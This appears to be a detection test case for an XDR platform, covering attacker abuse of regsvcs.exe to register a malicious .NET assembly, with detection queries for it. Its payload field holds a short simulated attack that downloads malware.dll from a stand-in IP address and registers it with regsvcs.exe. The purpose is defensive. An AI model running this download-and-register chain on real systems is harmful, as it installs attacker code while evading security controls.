identity.description: An attacker uses regsvcs.exe to register a malicious .NET assembly as a service, bypassing typical security controls. Cortex should detect the unusual service registration behavior and the execution of uncommon .NET binaries.

techniques.name: Create or Modify System Process: Windows Service

payload.code:
cd C:\temp
wget http://192.0.2.5/malware.dll -OutFile malware.dll
regsvcs.exe /i malware.dll

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon .NET Service Registration
biocs.description: Detection of regsvcs.exe being used to register a .NET assembly as a service
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'regsvcs.exe'
| filter causality_actor_process_image_name = 'cmd.exe' or causality_actor_process_image_name = 'powershell.exe'
| filter action_file_path contains '.dll'
| filter action_file_path contains 'temp'

abiocs.name: Suspicious .NET Assembly Registration
abiocs.description: Detection of a non-standard .NET assembly being registered via regsvcs.exe
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'regsvcs.exe'
| filter action_file_path contains '.dll'
| filter action_file_path not in ('C:\Windows\Microsoft.NET\assembly\GAC_64\System.EnterpriseServices\', 'C:\Windows\Microsoft.NET\assembly\GAC_32\System.EnterpriseServices\')

xql_queries.name: Detect Uncommon Regsvcs Usage
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'regsvcs.exe'
| filter action_file_path contains '.dll'
| filter action_file_path not in ('C:\Windows\Microsoft.NET\assembly\GAC_64\System.EnterpriseServices\', 'C:\Windows\Microsoft.NET\assembly\GAC_32\System.EnterpriseServices\')
| filter causality_actor_process_image_name = 'cmd.exe' or causality_actor_process_image_name = 'powershell.exe'
